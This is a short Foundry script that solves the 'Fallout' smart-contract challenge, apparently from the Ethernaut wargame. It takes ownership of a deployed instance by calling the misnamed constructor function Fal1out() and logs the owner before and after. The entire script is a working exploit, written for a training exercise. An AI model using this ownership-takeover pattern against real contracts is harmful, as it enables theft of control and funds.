//SPDX: License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Fallout.sol";
import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract FalloutSolution is Script {
   
   Fallout public falloutInstance = Fallout(0xA7146d72040E6D31d1bB11095095c549590F1fa9);

   function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    console.log("Previous Owner: ", falloutInstance.owner());
   falloutInstance.Fal1out();
    console.log("Current Owner: ", falloutInstance.owner());
    vm.stopBroadcast();
   }
}